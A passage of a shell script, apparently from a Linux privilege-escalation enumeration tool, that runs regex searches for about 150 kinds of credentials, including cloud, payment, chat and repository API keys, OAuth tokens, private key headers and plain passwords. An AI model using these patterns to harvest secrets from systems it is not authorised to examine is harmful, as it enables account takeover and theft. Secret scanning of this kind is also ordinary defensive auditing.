  5566	    search_for_regex "Atlassian API Key" "(atlassian[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{24})['\"]" 1
  5567	    search_for_regex "AWS Client ID" "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" 
  5568	    search_for_regex "AWS MWS Key" "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" 
  5569	    search_for_regex "AWS Secret Key" "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" 
  5570	    search_for_regex "AWS AppSync GraphQL Key" "da2-[a-z0-9]{26}" 
  5571	    search_for_regex "Basic Auth Credentials" "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" 
  5572	    search_for_regex "Beamer Client Secret" "(beamer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"](b_[a-z0-9=_\-]{44})['\"]" 1
  5573	    search_for_regex "Binance API Key" "(binance[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{64})['\"]" 1
  5574	    search_for_regex "Bitbucket Client Id" "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"])" 1
  5575	    search_for_regex "Bitbucket Client Secret" "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9_\-]{64})['\"])" 1
  5576	    search_for_regex "BitcoinAverage API Key" "(bitcoin.?average[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{43})['\"]" 1
  5577	    search_for_regex "Bitquery API Key" "(bitquery[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Za-z0-9]{32})['\"]" 1
  5578	    search_for_regex "Birise API Key" "(bitrise[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9_\-]{86})['\"]" 1
  5579	    search_for_regex "Block API Key" "(block[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})['\"]" 1
  5580	    search_for_regex "Blockchain API Key" "mainnet[a-zA-Z0-9]{32}|testnet[a-zA-Z0-9]{32}|ipfs[a-zA-Z0-9]{32}" 
  5581	    search_for_regex "Blockfrost API Key" "(blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['\"]" 1
  5582	    search_for_regex "Box API Key" "(box[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{32})['\"]" 1
  5583	    search_for_regex "Bravenewcoin API Key" "(bravenewcoin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{50})['\"]" 1
  5584	    search_for_regex "Clearbit API Key" "sk_[a-z0-9]{32}" 
  5585	    search_for_regex "Clojars API Key" "(CLOJARS_)[a-zA-Z0-9]{60}" 
  5586	    search_for_regex "Cloudinary Basic Auth" "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" 
  5587	    search_for_regex "Coinlayer API Key" "(coinlayer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
  5588	    search_for_regex "Coinlib API Key" "(coinlib[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{16})['\"]" 1
  5589	    search_for_regex "Contentful delivery API Key" "(contentful[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9=_\-]{43})['\"]" 1
  5590	    search_for_regex "Covalent API Key" "ckey_[a-z0-9]{27}" 
  5591	    search_for_regex "Charity Search API Key" "(charity.?search[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
  5592	    search_for_regex "Databricks API Key" "dapi[a-h0-9]{32}" 
  5593	    search_for_regex "DDownload API Key" "(ddownload[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{22})['\"]" 1
  5594	    search_for_regex "Defined Networking API token" "(dnkey-[a-z0-9=_\-]{26}-[a-z0-9=_\-]{52})" 
  5595	    search_for_regex "Discord API Key, Client ID & Client Secret" "((discord[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-h0-9]{64}|[0-9]{18}|[a-z0-9=_\-]{32})['\"])" 1
  5596	    search_for_regex "Dropbox API Key" "sl.[a-zA-Z0-9_-]{136}" 
  5597	    search_for_regex "Doppler API Key" "(dp\.pt\.)[a-zA-Z0-9]{43}" 
  5598	    search_for_regex "Dropbox API secret/key, short & long lived API Key" "(dropbox[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{15}|sl\.[a-z0-9=_\-]{135}|[a-z0-9]{11}(AAAAAAAAAA)[a-z0-9_=\-]{43})['\"]" 1
  5599	    search_for_regex "Duffel API Key" "duffel_(test|live)_[a-zA-Z0-9_-]{43}" 
  5600	    search_for_regex "Dynatrace API Key" "dt0c01\.[a-zA-Z0-9]{24}\.[a-z0-9]{64}" 
  5601	    search_for_regex "EasyPost API Key" "EZAK[a-zA-Z0-9]{54}" 
  5602	    search_for_regex "EasyPost test API Key" "EZTK[a-zA-Z0-9]{54}" 
  5603	    search_for_regex "Etherscan API Key" "(etherscan[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Z0-9]{34})['\"]" 
  5604	    search_for_regex "Facebook Access Token" "EAACEdEose0cBA[0-9A-Za-z]+" 
  5605	    search_for_regex "Facebook Client ID" "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" 
  5606	    search_for_regex "Facebook Oauth" "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" 
  5607	    search_for_regex "Facebook Secret Key" "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" 
  5608	    search_for_regex "Fastly API Key" "(fastly[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9=_\-]{32})['\"]" 1
  5609	    search_for_regex "Finicity API Key & Client Secret" "(finicity[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{32}|[a-z0-9]{20})['\"]" 1
  5610	    search_for_regex "Flutterweave Keys" "FLWPUBK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST[a-hA-H0-9]{12}" 
  5611	    search_for_regex "Frame.io API Key" "fio-u-[a-zA-Z0-9_=\-]{64}" 
  5612	    search_for_regex "Github" "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" 
  5613	    search_for_regex "Github App Token" "(ghu|ghs)_[0-9a-zA-Z]{36}" 
  5614	    search_for_regex "Github OAuth Access Token" "gho_[0-9a-zA-Z]{36}" 
  5615	    search_for_regex "Github Personal Access Token" "ghp_[0-9a-zA-Z]{36}" 
  5616	    search_for_regex "Github Refresh Token" "ghr_[0-9a-zA-Z]{76}" 
  5617	    search_for_regex "GitHub Fine-Grained Personal Access Token" "github_pat_[0-9a-zA-Z_]{82}" 
  5618	    search_for_regex "Gitlab Personal Access Token" "glpat-[0-9a-zA-Z\-]{20}" 
  5619	    search_for_regex "GitLab Pipeline Trigger Token" "glptt-[0-9a-f]{40}" 
  5620	    search_for_regex "GitLab Runner Registration Token" "GR1348941[0-9a-zA-Z_\-]{20}" 
  5621	    search_for_regex "GoCardless API Key" "live_[a-zA-Z0-9_=\-]{40}" 
  5622	    search_for_regex "GoFile API Key" "(gofile[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{32})['\"]" 1
  5623	    search_for_regex "Google API Key" "AIza[0-9A-Za-z_\-]{35}" 
  5624	    search_for_regex "Google Cloud Platform API Key" "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" 
  5625	    search_for_regex "Google Drive Oauth" "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" 
  5626	    search_for_regex "Google Oauth Access Token" "ya29\.[0-9A-Za-z_\-]+" 
  5627	    search_for_regex "Google (GCP) Service-account" "\"type.+:.+\"service_account" 
  5628	    search_for_regex "Grafana API Key" "eyJrIjoi[a-z0-9_=\-]{72,92}" 1
  5629	    search_for_regex "Grafana cloud api token" "glc_[A-Za-z0-9\+/]{32,}={0,2}" 
  5630	    search_for_regex "Grafana service account token" "(glsa_[A-Za-z0-9]{32}_[A-Fa-f0-9]{8})" 
  5631	    search_for_regex "Hashicorp Terraform user/org API Key" "[a-z0-9]{14}\.atlasv1\.[a-z0-9_=\-]{60,70}" 
  5632	    search_for_regex "Heroku API Key" "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" 
  5633	    search_for_regex "Hubspot API Key" "['\"][a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12}['\"]" 1
  5634	    search_for_regex "Instatus API Key" "(instatus[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
  5635	    search_for_regex "Intercom API Key & Client Secret/ID" "(intercom[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9=_]{60}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['\"]" 1
  5636	    search_for_regex "Ionic API Key" "(ionic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"](ion_[a-z0-9]{42})['\"]" 1
  5637	    search_for_regex "Jenkins Creds" "<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" 
  5638	    search_for_regex "JSON Web Token" "(ey[0-9a-z]{30,34}\.ey[0-9a-z\/_\-]{30,}\.[0-9a-zA-Z\/_\-]{10,}={0,2})" 
  5639	    search_for_regex "Kraken Access Token" "([a-z0-9\/=_\+\-]{80,90})" 
  5640	    search_for_regex "Kucoin Secret Key" "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" 
  5641	    search_for_regex "Linear API Key" "(lin_api_[a-zA-Z0-9]{40})" 
  5642	    search_for_regex "Linear Client Secret/ID" "((linear[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{32})['\"])" 
  5643	    search_for_regex "LinkedIn Client ID" "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" 
  5644	    search_for_regex "LinkedIn Secret Key" "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" 
  5645	    search_for_regex "Lob API Key" "((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]((live|test)_[a-f0-9]{35})['\"])|((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]((test|live)_pub_[a-f0-9]{31})['\"])" 1
  5646	    search_for_regex "Lob Publishable API Key" "((test|live)_pub_[a-f0-9]{31})" 
  5647	    search_for_regex "MailboxValidator" "(mailbox.?validator[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Z0-9]{20})['\"]" 1
  5648	    search_for_regex "Mailchimp API Key" "[0-9a-f]{32}-us[0-9]{1,2}" 
  5649	    search_for_regex "Mailgun API Key" "key-[0-9a-zA-Z]{32}'" 
  5650	    search_for_regex "Mailgun Public Validation Key" "pubkey-[a-f0-9]{32}" 
  5651	    search_for_regex "Mailgun Webhook signing key" "[a-h0-9]{32}-[a-h0-9]{8}-[a-h0-9]{8}" 
  5652	    search_for_regex "Mapbox API Key" "(pk\.[a-z0-9]{60}\.[a-z0-9]{22})" 1
  5653	    search_for_regex "MessageBird API Key & API client ID" "(messagebird[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{25}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['\"]" 1
  5654	    search_for_regex "Microsoft Teams Webhook" "https:\/\/[a-z0-9]+\.webhook\.office\.com\/webhookb2\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}@[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}\/IncomingWebhook\/[a-z0-9]{32}\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}" 
  5655	    search_for_regex "New Relic User API Key, User API ID & Ingest Browser API Key" "(NRAK-[A-Z0-9]{27})|((newrelic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Z0-9]{64})['\"])|(NRJS-[a-f0-9]{19})" 
  5656	    search_for_regex "Nownodes" "(nownodes[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Za-z0-9]{32})['\"]" 
  5657	    search_for_regex "Npm Access Token" "(npm_[a-zA-Z0-9]{36})" 
  5658	    search_for_regex "ORB Intelligence Access Key" "['\"][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['\"]" 
  5659	    search_for_regex "Pastebin API Key" "(pastebin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
  5660	    search_for_regex "PayPal Braintree Access Token" "access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}" 
  5661	    search_for_regex "Picatic API Key" "sk_live_[0-9a-z]{32}" 
  5662	    search_for_regex "Pinata API Key" "(pinata[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{64})['\"]" 1
  5663	    search_for_regex "Planetscale API Key" "pscale_tkn_[a-zA-Z0-9_\.\-]{43}" 
  5664	    search_for_regex "PlanetScale OAuth token" "(pscale_oauth_[a-zA-Z0-9_\.\-]{32,64})" 
  5665	    search_for_regex "Planetscale Password" "pscale_pw_[a-zA-Z0-9_\.\-]{43}" 
  5666	    search_for_regex "Plaid API Token" "(access-(?:sandbox|development|production)-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" 
  5667	    search_for_regex "Prefect API token" "(pnu_[a-z0-9]{36})" 
  5668	    search_for_regex "Postman API Key" "PMAK-[a-fA-F0-9]{24}-[a-fA-F0-9]{34}" 
  5669	    search_for_regex "Private Keys" "\-\-\-\-\-BEGIN PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN RSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN OPENSSH PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN PGP PRIVATE KEY BLOCK\-\-\-\-\-|\-\-\-\-\-BEGIN DSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN EC PRIVATE KEY\-\-\-\-\-" 
  5670	    search_for_regex "Pulumi API Key" "pul-[a-f0-9]{40}" 
  5671	    search_for_regex "PyPI upload token" "pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}" 
  5672	    search_for_regex "Quip API Key" "(quip[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{15}=\|[0-9]{10}\|[a-zA-Z0-9\/+]{43}=)['\"]" 1
  5673	    search_for_regex "Rubygem API Key" "rubygems_[a-f0-9]{48}" 
  5674	    search_for_regex "Readme API token" "rdme_[a-z0-9]{70}" 
  5675	    search_for_regex "Sendbird Access ID" "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" 
  5676	    search_for_regex "Sendgrid API Key" "SG\.[a-zA-Z0-9_\.\-]{66}" 
  5677	    search_for_regex "Sendinblue API Key" "xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}" 
  5678	    search_for_regex "Shippo API Key, Access Token, Custom Access Token, Private App Access Token & Shared Secret" "shippo_(live|test)_[a-f0-9]{40}|shpat_[a-fA-F0-9]{32}|shpca_[a-fA-F0-9]{32}|shppa_[a-fA-F0-9]{32}|shpss_[a-fA-F0-9]{32}" 
  5679	    search_for_regex "Sidekiq Secret" "([a-f0-9]{8}:[a-f0-9]{8})" 
  5680	    search_for_regex "Sidekiq Sensitive URL" "([a-f0-9]{8}:[a-f0-9]{8})@(?:gems.contribsys.com|enterprise.contribsys.com)" 
  5681	    search_for_regex "Slack Token" "xox[baprs]-([0-9a-zA-Z]{10,48})?" 
  5682	    search_for_regex "Slack Webhook" "https://hooks.slack.com/services/T[a-zA-Z0-9_]{10}/B[a-zA-Z0-9_]{10}/[a-zA-Z0-9_]{24}" 
  5683	    search_for_regex "Smarksheel API Key" "(smartsheet[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{26})['\"]" 1
  5684	    search_for_regex "Square Access Token" "sqOatp-[0-9A-Za-z_\-]{22}" 
  5685	    search_for_regex "Square API Key" "EAAAE[a-zA-Z0-9_-]{59}" 
  5686	    search_for_regex "Square Oauth Secret" "sq0csp-[ 0-9A-Za-z_\-]{43}" 
  5687	    search_for_regex "Stytch API Key" "secret-.*-[a-zA-Z0-9_=\-]{36}" 
  5688	    search_for_regex "Stripe Access Token & API Key" "(sk|pk)_(test|live)_[0-9a-z]{10,32}|k_live_[0-9a-zA-Z]{24}" 1
  5689	    search_for_regex "Telegram Bot API Token" "[0-9]+:AA[0-9A-Za-z\\-_]{33}" 
  5690	    search_for_regex "Trello API Key" "(trello[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-z]{32})['\"]" 
  5691	    search_for_regex "Twilio API Key" "SK[0-9a-fA-F]{32}" 
  5692	    search_for_regex "Twitch API Key" "(twitch[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{30})['\"]" 
  5693	    search_for_regex "Twitter Client ID" "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" 
  5694	    search_for_regex "Twitter Bearer Token" "(A{22}[a-zA-Z0-9%]{80,100})" 
  5695	    search_for_regex "Twitter Oauth" "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" 
  5696	    search_for_regex "Twitter Secret Key" "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" 
  5697	    search_for_regex "Typeform API Key" "tfp_[a-z0-9_\.=\-]{59}" 
  5698	    search_for_regex "URLScan API Key" "['\"][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['\"]" 
  5699	    search_for_regex "Yandex Access Token" "(t1\.[A-Z0-9a-z_-]+[=]{0,2}\.[A-Z0-9a-z_-]{86}[=]{0,2})" 
  5700	    search_for_regex "Yandex API Key" "(AQVN[A-Za-z0-9_\-]{35,38})" 
  5701	    search_for_regex "Yandex AWS Access Token" "(YC[a-zA-Z0-9_\-]{38})" 
  5702	    search_for_regex "Web3 API Key" "(web3[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Za-z0-9_=\-]+\.[A-Za-z0-9_=\-]+\.?[A-Za-z0-9_.+/=\-]*)['\"]" 1
  5703	    echo ''
  5704	
  5705	    print_2title "Searching Misc"
  5706	    search_for_regex "Generic Secret" "[sS][eE][cC][rR][eE][tT].*['\"][0-9a-zA-Z]{32,45}['\"]" 
  5707	    search_for_regex "Basic Auth" "//(.+):(.+)@" 
  5708	    search_for_regex "PHP Passwords" "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass|pass').*[=:].+|define ?\('(\w*pass|\w*pwd|\w*user|\w*datab)" 
  5709	    search_for_regex "Config Secrets" "passwd.*|creden.*|^kind:[^a-zA-Z0-9_]?Secret|[^a-zA-Z0-9_]env:|secret:|secretName:|^kind:[^a-zA-Z0-9_]?EncryptionConfiguration|\-\-encryption\-provider\-config" 
  5710	    search_for_regex "Simple Passwords" "passw.*[=:].+" 
  5711	    search_for_regex "Generiac API tokens search" "(access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key| amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret| api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret| application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket| aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password| bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key| bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver| cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret| client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password| cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|conn.login| connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test| datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password| digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd| docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid| dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password| env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z_=\-]{8,64})['\"]" 
  5712	    search_for_regex "Usernames" "username.*[=:].+" 
  5713	    search_for_regex "Net user add" "net user .+ /add" 
  5714	    echo ''
  5715	
  5716	
  5717	else
  5718	    echo "Regexes to search for API keys aren't activated, use param '-r' "
  5719	fi
  5720	fi
  5721	echo ''
  5722	echo ''
  5723	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
